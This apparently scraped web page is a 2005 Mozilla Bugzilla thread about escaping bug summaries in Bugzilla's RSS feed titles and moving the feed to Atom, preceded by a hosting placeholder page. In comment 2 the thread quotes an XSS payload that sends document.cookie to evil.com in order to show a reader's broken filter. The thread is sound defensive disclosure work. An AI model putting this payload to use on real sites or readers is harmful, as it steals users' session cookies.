=== Content from www.vupen.com_b002f1ce_20250125_231138.html ===

[![](/__ovh/common/img/logo-white.png)](https://www.ovhcloud.com/)

![](/__ovh/common/img/icon-traffic-cone.png)

# Site en construction

![](/__ovh/common/img/shadow.png)

Besoin d'assistance ou d'informations ?

[![](/__ovh/common/img/icon-book.png)
Guides](https://docs.ovh.com/fr/hosting/ "Guides")
[![](/__ovh/common/img/icon-speech-bubble.png)
Forum](https://community.ovh.com/ "Forum")
[![](/__ovh/common/img/icon-user-support.png)
Contact](https://help.ovhcloud.com/fr/ "Contact")
[![](/__ovh/common/img/icon-app-gear.png)
Espace Client](https://www.ovh.com/manager/ "Espace Client")

© Copyright 1999 [OVHcloud](https://www.ovhcloud.com/)

v1v2v3v4v5v6v7v8v9v10v11v12v13v14v15v16v17v18v19v20v21v22v23v24v25v26v27v28v29v30v31v32v33v34v35v36v37v38v39v40v41v42v43v44v45v46v47v48v49v50v51v52v53v54v55v56v57v58v59v60v61v62v63v64v65v66v67v68v69v70

u1u2u3u4u5u6u7u8u9u10u11u12u13u14u15u16u17u18u19u20u21u22u23u24u25u26u27u28u29u30u31u32u33u34u35u36u37u38u39u40u41u42u43u44u45u46u47u48u49u50u51u52u53u54u55u56u57u58u59u60u61u62u63u64u65u66u67u68u69

p1p2p3p4p5p6p7p8p9p10p11p12p13p14p15p16p17p18p19p20p21p22p23p24p25p26p27p28p29p30p31p32p33p34p35p36p37p38p39p40p41p42p43p44p45p46p47p48p49p50p51p52p53p54p55p56p57p58p59p60p61p62p63p64

e1e2e3e4e5e6e7e8e9e10e11e12e13e14e15e16e17e18e19e20e21e22e23e24e25e26e27e28e29e30e31e32e33e34e35e36e37e38e39e40e41e42e43e44e45e46e47e48e49e50e51e52e53

n1n2n3n4n5n6n7n8n9n10n11n12n13n14n15n16n17n18n19n20n21n22n23n24n25n26n27n28n29n30n31n32n33n34n35n36n37n38n39n40n41n42n43n44n45n46n47n48n49n50n51n52n53n54n55n56n57n58n59n60n61n62

---

c1c2c3c4c5c6c7c8c9c10c11c12c13c14c15c16c17c18c19c20c21c22c23c24c25c26c27c28c29c30c31c32c33c34c35c36c37c38c39c40c41c42c43c44c45c46c47c48c49c50c51

o1o2o3o4o5o6o7o8o9o10o11o12o13o14o15o16o17o18o19o20o21o22o23o24o25o26o27o28o29o30o31o32o33o34o35o36o37o38o39o40o41o42o43o44o45o46o47o48o49o50o51o52o53o54o55o56o57o58o59o60o61o62o63

m1m2m3m4m5m6m7m8m9m10m11m12m13m14m15m16m17m18m19m20m21m22m23m24m25m26m27m28m29m30m31m32m33m34m35m36m37m38m39m40m41m42m43m44m45m46m47m48m49m50m51m52m53m54m55m56m57m58m59m60m61



=== Content from bugzilla.mozilla.org_8534a51d_20250125_231140.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/313441)
* [XML](/show_bug.cgi?ctype=xml&id=313441)

Closed
[Bug 313441](/show_bug.cgi?id=313441)

Opened 19 years ago
Closed 19 years ago

# [SECURITY] Query RSS should HTML-escape summary in <title>

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

[SECURITY] Query RSS should HTML-escape summary in <title>

## Categories

### (Bugzilla :: Query/Bug List, defect)

[Product:](/describecomponents.cgi?product=Bugzilla)

Bugzilla
▾

Bugzilla
The [Bugzilla](http://www.bugzilla.org) bug-tracking system.

**Note:** This is **not** the place to request configuration, permission, or account changes to this installation of Bugzilla (bugzilla.mozilla.org). File such changes under the appropriate component in the [**bugzilla.mozilla.org**](enter_bug.cgi?product=bugzilla.mozilla.org) product.
[See Open Bugs in This Product](/buglist.cgi?product=Bugzilla&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Bugzilla)
Watch This Product

[Component:](/describecomponents.cgi?product=Bugzilla&component=Query%2FBug%20List#Query%2FBug%20List)

Query/Bug List
▾

Bugzilla :: Query/Bug List
Anything to do with searching for bugs and viewing the buglists. `query.cgi` and `buglist.cgi`
[See Open Bugs in This Component](/buglist.cgi?product=Bugzilla&component=Query%2FBug%20List&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Bugzilla&component=Query%2FBug%20List&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Bugzilla&component=Query%2FBug%20List)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

2.20

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

All

All

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

*Not set*

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

critical

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

Bugzilla 2.20

## People

### (Reporter: philor, Assigned: philor)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/2b6c1ba0915a97a81d59ca1e101e6d74?d=mm&size=40)  [philor](/user_profile?user_id=135518)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

![](https://secure.gravatar.com/avatar/9df24a05a7e63cf07e49d30ddfeee31a?d=mm&size=40)  [default-qa](/user_profile?user_id=5086)

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/2b6c1ba0915a97a81d59ca1e101e6d74?d=mm&size=40)  [philor](/user_profile?user_id=135518)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

---

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

8 people

## References

### ( [URL](http://ietf.org/rfc/rfc4287 "http://ietf.org/rfc/rfc4287") )

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

[320312](/show_bug.cgi?id=320312 "RESOLVED FIXED - Security Advisory for 2.16.11, 2.18.5, 2.20.1, and 2.22rc1"), [367674](/show_bug.cgi?id=367674 "RESOLVED FIXED - [SECURITY] XSS when reading Atom feeds due to unescaped HTML")

[314659](/show_bug.cgi?id=314659 "RESOLVED FIXED - Provide more information for the Atom summary")

Dependency [tree](/showdependencytree.cgi?id=313441&hide_resolved=1)
/ [graph](/showdependencygraph.cgi?id=313441)

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[ietf.org/rfc/rfc4287](http://ietf.org/rfc/rfc4287 "http://ietf.org/rfc/rfc4287")

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

---

## Details

### (Whiteboard: [doesn't affect 2.16][doesn't affect 2.18][ready for 2.20.1][ready for2.21.2])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

---

[Keywords:](/describekeywords.cgi)

---

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[doesn't affect 2.16][doesn't affect 2.18][ready for 2.20.1][ready for2.21.2]

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [justdave](/user_profile?user_id=10297) | [approval](#c0 "19 years ago") | + |
| --- | --- | --- |
| [justdave](/user_profile?user_id=10297) | approval | + |
| --- | --- | --- |
| [justdave](/user_profile?user_id=10297) | [blocking2.22](#c11 "19 years ago") | + |
| --- | --- | --- |
| [justdave](/user_profile?user_id=10297) | blocking2.22 | + |
| --- | --- | --- |
| [justdave](/user_profile?user_id=10297) | [approval2.20](#c0 "19 years ago") | + |
| --- | --- | --- |
| [justdave](/user_profile?user_id=10297) | approval2.20 | + |
| --- | --- | --- |
| [justdave](/user_profile?user_id=10297) | [blocking2.20.1](#c1 "19 years ago") | + |
| --- | --- | --- |
| [justdave](/user_profile?user_id=10297) | blocking2.20.1 | + |
| --- | --- | --- |
|  | approval5.0 | ? |
| --- | --- | --- |
|  | approval5.2 | ? |
|  | approval6.0 | ? |
|  | blocking5.0.4.1 | ? |
|  | blocking5.2 | ? |
|  | blocking6.0 | ? |
|  | approval4.4 | ? |
|  | blocking4.4.14 | ? |
|  | sec-bounty | ? |
|  | sec-bounty-hof |  |
|  | documentation | ? + - |
|  | testcase |  | | |
|  | relnote |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (4 files, 4 obsolete files)

| [One filter ain't enough](/attachment.cgi?id=200571)  [19 years ago](#c3)  [Phil Ringnalda (:philor)](/user_profile?user_id=135518)   1.31 KB, patch |  | [Details](/attachment.cgi?id=200571&action=edit) | [Diff](/attachment.cgi?id=200571&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=313441&attachment=200571) |
| --- | --- | --- |
| [First cut work in progress](/attachment.cgi?id=205023)  [19 years ago](#c17)  [Phil Ringnalda (:philor)](/user_profile?user_id=135518)   8.47 KB, patch |  | [Details](/attachment.cgi?id=205023&action=edit) | [Diff](/attachment.cgi?id=205023&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=313441&attachment=205023) |
| [Like so?](/attachment.cgi?id=205101)  [19 years ago](#c21)  [Phil Ringnalda (:philor)](/user_profile?user_id=135518)   10.86 KB, patch | myk : [review-](#c0 "19 years ago") | [Details](/attachment.cgi?id=205101&action=edit) | [Diff](/attachment.cgi?id=205101&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=313441&attachment=205101) |
| [last, not pop](/attachment.cgi?id=205369)  [19 years ago](#c32)  [Phil Ringnalda (:philor)](/user_profile?user_id=135518)   14.70 KB, patch | myk : [review+](#c0 "19 years ago") | [Details](/attachment.cgi?id=205369&action=edit) | [Diff](/attachment.cgi?id=205369&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=313441&attachment=205369) |
| [For 2\_20-Branch](/attachment.cgi?id=205513)  [19 years ago](#c36)  [Phil Ringnalda (:philor)](/user_profile?user_id=135518)   14.30 KB, patch | myk : [review+](#c0 "19 years ago")  LpSolit : [review-](#c39 "19 years ago") | [Details](/attachment.cgi?id=205513&action=edit) | [Diff](/attachment.cgi?id=205513&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=313441&attachment=205513) |
| [2\_20-Branch v2](/attachment.cgi?id=208257)  [19 years ago](#c42)  [Phil Ringnalda (:philor)](/user_profile?user_id=135518)   14.26 KB, patch | myk : [review+](#c0 "19 years ago")  LpSolit : [review+](#c43 "19 years ago") | [Details](/attachment.cgi?id=208257&action=edit) | [Diff](/attachment.cgi?id=208257&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=313441&attachment=208257) |
| [docs patch for tip v1 about my comment](/attachment.cgi?id=213434)  [19 years ago](#c46)  [victory <never@receive.bug.mails.i.hate.spammer>](/user_profile?user_id=162556)   803 bytes, patch | timeless : [review+](#c0 "19 years ago") | [Details](/attachment.cgi?id=213434&action=edit) | [Diff](/attachment.cgi?id=213434&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=313441&attachment=213434) |
| [other docs patch for 2.20](/attachment.cgi?id=219117)  [19 years ago](#c47)  [victory <never@receive.bug.mails.i.hate.spammer>](/user_profile?user_id=162556)   1.29 KB, patch | mkanat : [review+](#c0 "19 years ago") | [Details](/attachment.cgi?id=219117&action=edit) | [Diff](/attachment.cgi?id=219117&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=313441&attachment=219117) |

Show Obsolete

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Phil Ringnalda (:philor)](/user_profile?user_id=135518)  Assignee |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=313441#c0)• 19 years ago |
|  | |

While it's formally correct and to-spec to have an RSS 1.0 <title> that includes &lt; when it isn't starting HTML markup, since the spec calls for plain text, practically speaking the title element has been so polluted with HTML that virtually all consumers treat it as HTML, and a literal < has to be double-escaped as &amp;lt; to not be treated as markup, and either filtered out or interpreted.
With <title>Wrong DOM-tree with &lt;form&gt; and &lt;button&gt; elements.</title>, my cautious RSS reader and Google Reader both display "Wrong DOM-tree with and elements.", but the very popular Bloglines reader treats them both as HTML, and displays an actual button with the text "elements." Switching to "FILTER html" instead of "FILTER xml" to get &amp;lt;form&amp;gt; would wind up displaying "&lt;form&gt;" in strict constructionist RSS readers, but anyone using them is surely used to that by now.

|  | [Dave Miller [:justdave]](/user_profile?user_id=10297) |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=313441#c1)• 19 years ago |
|  | |

XSS anyone?
Though it seems weird since we're already encoding them... couldn't that be considered an XSS bug in said readers?Group: webtools-securitySeverity: normal → criticalFlags: blocking2.20.1+Target Milestone: --- → Bugzilla 2.20

|  | [Phil Ringnalda (:philor)](/user_profile?user_id=135518)  Assignee |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=313441#c2)• 19 years ago |
|  | |

Bloglines must have broken their XSS filter: it's currently happy to display old favorites like |&lt;img src="..." onmouseover="this.src='<http://evil.com/get?'+document.cookie>">|, and since its whole interface is done in JavaScript... ouch. I don't \*think\* they've always been that insecure.
Me, I just want to be able to read the whole summary of bugs without missing chunks.

|  | [Phil Ringnalda (:philor)](/user_profile?user_id=135518)  Assignee |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=313441#c3)• 19 years ago |
|  | |

Attached patch

[One filter ain't enough](attachment.cgi?id=200571&action=diff) (obsolete)
— [Details](attachment.cgi?id=200571&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=313441&attachment=200571)

The fact that we call the desired state, &amp;lt; or &amp;amp;#161;, "double escaped" should have tipped me off that one FILTER wouldn't be enough. Static copy of sample output at <http://philringnalda.com/mtests/bugzilla/rss/escaped-title.xml> works fine in Bloglines and two other browser-based readers, and three desktop readers. Google Reader, though, is insane beyond belief, and double-decodes it and renders the HTML.
I should know better than to mention this sort of alternative when I want a patch reviewed, but: this ambiguity is one of the three reasons that Atom exists. <atom:title type="text">&lt;form&gt;</atom:title> has exactly one possible meaning, and no question whatsoever about who is wrong if it isn't displayed as "<form>".Assignee: query-and-buglist → bugzillaStatus: UNCONFIRMED → ASSIGNED
[Attachment #200571](/attachment.cgi?id=200571&action=edit "One filter ain't enough") -
Flags: review?(myk)

|  | [Phil Ringnalda (:philor)](/user_profile?user_id=135518)  Assignee |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=313441#c4)• 19 years ago |
|  | |

Meh. Google contacted. Bloglines contacted. NewsGator Online contacted.
If we're going to leave this security-sensitive until every browser-based RSS reader is free of XSS foolishness, we might want to clone an innocuous version to check in from. The first really wide-spread PoC I remember was the precursor to <http://diveintomark.org/archives/2003/06/12/how_to_consume_rss_safely> which was just a style="position:absolute;..." attribute. It's been very widely known in the RSS world that either you only allow through those elements and attributes you can trust, or you break and spew secrets, for more than two years, but it only took me half an hour to find XSS holes in the biggest three free online readers.

|  | [Phil Ringnalda (:philor)](/user_profile?user_id=135518)  Assignee |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=313441#c5)• 19 years ago |
|  | |

Google Reader: fixed. NewsGator Online: fixed. Bloglines: strongly not recommended to my friends and family anymore.

|  | [Phil Ringnalda (:philor)](/user_profile?user_id=135518)  Assignee |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=313441#c6)• 19 years ago |
|  | |

Comment on [attachment 200571](/attachment.cgi?id=200571 "One filter ain't enough") [[details]](/attachment.cgi?id=200571&action=edit "One filter ain't enough") [[diff]](/attachment.cgi?id=200571&action=diff "One filter ain't enough") [[review]](/page.cgi?id=splinter.html&ignore=&bug=313441&attachment=200571)
One filter ain't enough
My blessedly spotty memory made me forget the details of this impossible situation: RSS 1.0 clearly specifies that title is plain text, the author of RSS 2.0 says that because the spec says that description may contain entity-encoded HTML but it doesn't say that title may, the content model for RSS 2.0 title is plain text, so the feed validator warns on any feed which contains anything which might be escaped HTML, so the current RSS is absolutely unquestionably correct, and fails in virtually any client (and those like Firefox where it doesn't have bugs filed on them to make them fail).
If you need to use the character "<" in a feed title, which Bugzilla absolutely does, you have exactly three choices: be invalid and work, be valid and fail, or, the \*only\* real choice, use Atom instead.
[Attachment #200571](/attachment.cgi?id=200571&action=edit "One filter ain't enough") -
Attachment is obsolete: true
[Attachment #200571](/attachment.cgi?id=200571&action=edit "One filter ain't enough") -
Flags: review?(myk)

|  | [Frédéric Buclin](/user_profile?user_id=120380) |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=313441#c7)• 19 years ago |
|  | |

If I understand correctly, what we actually do is correct. And even if some tags are interpreted in the bug summary, I really don't see how they could use this exploit to get sensitive information.
I'm suggesting WONTFIX.

|  | [Dave Miller [:justdave]](/user_profile?user_id=10297) |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=313441#c8)• 19 years ago |
|  | |

Jesse, Dan, Brad, opinions? Or Myk even (forumzilla) ?

|  | [Dave Miller [:justdave]](/user_profile?user_id=10297) |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=313441#c9)• 19 years ago |
|  | |

The official RSS spec at <http://web.resource.org/rss/1.0/spec#s5.5.1>
says that the <title> element contains #PCDATA, it does not say that it contains plain text.
According to W3Schools (<http://www.w3schools.com/dtd/dtd_building.asp>):
----8<----
PCDATA means parsed character data.
Think of character data as the text found between the start tag and the end tag of an XML element.
PCDATA is text that will be parsed by a parser. Tags inside the text will be treated as markup and entities will be expanded.
----8<----
This means if we follow the spec to the letter, the contents of the title CAN contain <, >, and &, but they need to be escaped. ONCE. Any that are not escaped will be treated as tags and parsed.
This is what we do now for title. So Bugzilla is fine. If we follow the spec.
However, looking at the source of our RSS, we appear to be escaping the HTML in the <description> field, also, which is also declared to be #PCDATA.
<description>
&lt;table&gt;
&lt;tr&gt;
&lt;th&gt;Field&lt;/th&gt;&lt;th&gt;Value&lt;/th&gt;
&lt;/tr&gt;&lt;tr&gt;
&lt;td&gt;Opened&lt;/td&gt;
&lt;td&gt;2005-10-24&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;
&lt;td&gt;Assignee&lt;/td&gt;
&lt;td&gt;Dave Miller&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;
&lt;td&gt;Priority&lt;/td&gt;
&lt;td&gt;--&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;
&lt;td&gt;Severity &lt;/td&gt;
&lt;td&gt;blocker&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;
&lt;td&gt;Status&lt;/td&gt;
&lt;td&gt;NEW&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;
&lt;td&gt;Changed&lt;/td&gt;
&lt;td&gt;Mon 07:01&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;
</description>
If I'm reading the spec correctly, this is over-escaped. Yet it looks fine in my RSS reader (NetNewsWire Lite).

|  | [Phil Ringnalda (:philor)](/user_profile?user_id=135518)  Assignee |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=313441#c10)• 19 years ago |
|  | |

What the RSS 1.0 spec says matters formally, but not practically, because by far the bulk of consumers just parse everything into uniform buckets and treat the contents as escaped soup even if they didn't come from RSS 2.0. See, e.g., <http://groups.yahoo.com/group/rss-dev/message/7255> and up the thread where RSS-DEV working group members say, roughly, "RSS 2.0 has polluted the content model, it's now escaped HTML."
If you want to be formally correct with content, while still passing HTML, you can use the <content:encoded> element for escaped HTML, but you still have the same problem with the required <description> that you have with <title>: it cannot contain HTML, but < passed correctly for plain text as &lt; will be interpreted as markup. Even Thunderbird, which survives the unescaped titles, interprets markup in description.
If you insist on not switching to Atom, and insist on not following the lead of virtually every consumer and the advice of the WG, there is one other option: replace every "<" in titles and plain text descriptions with a roughly similar looking character, say a &#x2039;. It looks awful in most fonts, but at least it's unambiguously not markup.

|  | [Dave Miller [:justdave]](/user_profile?user_id=10297) |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=313441#c11)• 19 years ago |
|  | |

OK, basically there's no sane way to fix this while continuing to use RSS 1.0. If we intend to have HTML markup (or characters that could be used to create HTML markup) then we need to be using either RSS 2.0 or Atom.Flags: blocking2.22+

|  | [Phil Ringnalda (:philor)](/user_profile?user_id=135518)  Assignee |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=313441#c12)• 19 years ago |
|  | |

(In reply to [comment #11](/show_bug.cgi?id=313441#c11 "RESOLVED FIXED - [SECURITY] Query RSS should HTML-escape summary in <title>"))
> we need to be using either RSS 2.0 or Atom.
RSS 2.0 only solves the problem for <description>, and is even more ambiguous for instances of "&lt;" or "&amp;lt;" in <title>s, since the only points of reference for whether it's HTML or plain text are a weblog post by the spec author which explicitly says "this is not spec text" and each individual's interpretation of the meaning of the spec saying of <description> that it "may contain entity-encoded HTML" and saying nothing either way about <title>.
Even with Atom, there are still likely to be consumers which will misrender it; the difference is that for any misrendering, there is no doubt whatsoever whether it's Bugzilla's bug or the consumer's bug.

|  | [Myk Melez [:myk] [@mykmelez]](/user_profile?user_id=27300) |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=313441#c13)• 19 years ago |
|  | |

RSS 2.0 has numerous problems besides just the inconsistency Phil pointed out. RSS 1.0 is better, but work on it seems to have died out years ago, and it hasn't kept up with the times. Atom is both extant and sensible. We should switch to it.

|  | [Frédéric Buclin](/user_profile?user_id=120380) |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=313441#c14)• 19 years ago |
|  | |

This may help us writing Atom feeds:
<http://www.atomenabled.org/developers/syndication/>
Also: "2005-11-21: W3C is pleased to launch the W3C Feed Validation Service, a free online tool open to creators of syndication feeds in formats such as RSS and Atom." The URL is: <http://validator.w3.org/feed/>

|  | [Frédéric Buclin](/user_profile?user_id=120380) |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=313441#c15)• 19 years ago |
|  | |

Phil, are you going to implement Atom yourself? This bug is assigned to you and we plan to release 2.20.1 and 2.21.2 very soon now.Whiteboard: [doesn't affect 2.16, doesn't affect 2.18]

|  | [Phil Ringnalda (:philor)](/user_profile?user_id=135518)  Assignee |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=313441#c16)• 19 years ago |
|  | |

Gah, you're right, I did forget it was assigned to me. I'm working on it now, but anyone should feel free to steal it if I screw up again. Speaking of which: anyone who can, which doesn't seem to include me, should make it public: the last need for it to be security-sensitive, Bloglines' XSS holes, mostly got fixed after I published them, and then I screwed up and syndicated that post to planet.m.o, so the whole Moz community already knows about their vulnerability.
(BTW: W3C's feed validator is a branch, currently from mid-October though they're going to try to get closer to tip; <http://www.feedvalidator.org> is at most a few hours behind tip.)

|  | [Phil Ringnalda (:philor)](/user_profile?user_id=135518)  Assignee |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=313441#c17)• 19 years ago |
|  | |

Attached patch

[First cut work in progress](attachment.cgi?id=205023&action=diff) (obsolete)
— [Details](attachment.cgi?id=205023&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=313441&attachment=205023)

Close as I think I can get with read-only access: I don't know how to fake a cvs remove of list.rss.tmpl.
The code to get the feed/updated date could use a more experienced eyeballing: it seems to work with my test data, but I haven't ever done much with Template Toolkit to know what's right and wrong.
Both sorts of <id>s make me nervous: the feed/id with lots of URL-encoding and XML-escaping is at risk of misinterpretation by buggy software, though there's really no alternative, and the entry/ids quite possibly should be specific to a particular feed, and not the id that an entry containing the whole content of the bug would use, but minting a feed-specific tag: URI isn't easy.
Then there's the choice of which sort of content escaping to use, which is the biggest reason I'm not really ready for actual review: even though Atom makes it perfectly clear who is at fault, there's at least one widely-used reader which will misinterpret any given type. For the otherwise-best choice, type="html", Firefox is one of the ones misinterpreting it, but with Firefox's only workable choice, type="text", we're back to [comment 0](/show_bug.cgi?id=313441#c0 "RESOLVED FIXED - [SECURITY] Query RSS should HTML-escape summary in <title>") - Bloglines (clearly incorrectly, in type="text" Atom) interprets what they should be escaping, though with a few less XSS holes than a month ago.

|  | [Frédéric Buclin](/user_profile?user_id=120380) |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=313441#c18)• 19 years ago |
|  | |

Comment on [attachment 205023](/attachment.cgi?id=205023 "First cut work in progress") [[details]](/attachment.cgi?id=205023&action=edit "First cut work in progress") [[diff]](/attachment.cgi?id=205023&action=diff "First cut work in progress") [[review]](/page.cgi?id=splinter.html&ignore=&bug=313441&attachment=205023)
First cut work in progress
>Index: webtools/bugzilla/buglist.cgi
>-if ($format->{'extension'} eq 'rss') {
>+if ($format->{'extension'} eq 'rss' ||
>+ $format->{'extension'} eq 'atom') {
Any reason to keep 'rss' here?

|  | [Phil Ringnalda (:philor)](/user_profile?user_id=135518)  Assignee |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=313441#c19)• 19 years ago |
|  | |

(In reply to [comment #18](/show_bug.cgi?id=313441#c18 "RESOLVED FIXED - [SECURITY] Query RSS should HTML-escape summary in <title>"))
> Any reason to keep 'rss' here?
An abortive attempt at not breaking existing users, and installs that want to use RSS or both (client support for Atom isn't perfect and complete yet, and there are people with political preferences for one over the other).
Advice welcome: should I just intercept ctype=rss and force it to ctype=atom at some point?

|  | [Myk Melez [:myk] [@mykmelez]](/user_profile?user_id=27300) |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=313441#c20)• 19 years ago |
|  | |

> Advice welcome: should I just intercept ctype=rss and force it to ctype=atom at
> some point?
I think that's the best behavior. Feed readers generally grep for feed type, so they should be able to handle the type changing out from under them, and if we're not going to have an RSS feed anymore we're better off directing users to the Atom feed than telling them "document not found".

|  | [Phil Ringnalda (:philor)](/user_profile?user_id=135518)  Assignee |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=313441#c21)• 19 years ago |
|  | |

Attached patch

[Like so?](attachment.cgi?id=205101&action=diff) (obsolete)
— [Details](attachment.cgi?id=205101&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=313441&attachment=205101)

Okay, with a cvs remove list.rss.tmpl I think this wipes it out completely.
[Attachment #205023](/attachment.cgi?id=205023&action=edit "First cut work in progress") -
Attachment is obsolete: true
[Attachment #205101](/attachment.cgi?id=205101&action=edit "Like so?") -
Flags: review?(myk)

|  | [Frédéric Buclin](/user_profile?user_id=120380) |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=313441#c22)• 19 years ago |
|  | |

(In reply to [comment #21](/show_bug.cgi?id=313441#c21 "RESOLVED FIXED - [SECURITY] Query RSS should HTML-escape summary in <title>"))
> Okay, with a cvs remove list.rss.tmpl I think this wipes it out completely.
cvsdo remove template/en/default/list/list.rss.html
/usr/bin/cvsdo is in the cvsutils package. And it doesn't require any write access privilege. ;)

|  | [Phil Ringnalda (:philor)](/user_profile?user_id=135518)  Assignee |  |
| --- | --- | --- |
| [Comment 23](/show_bug.cgi?id=313441#c23)• 19 years ago |
|  | |

cc:ing some Atomistas, if the security flag lets me: [comment 17](/show_bug.cgi?id=313441#c17 "RESOLVED FIXED - [SECURITY] Query RSS should HTML-escape summary in <title>") and sample output at <http://philringnalda.com/mtests/bugzilla/atom/bugs-2005-12-05.atom> if you'd be so kind.

|  | [Frédéric Buclin](/user_profile?user_id=120380) |  |
| --- | --- | --- |
| [Comment 24](/show_bug.cgi?id=313441#c24)• 19 years ago |
|  | |

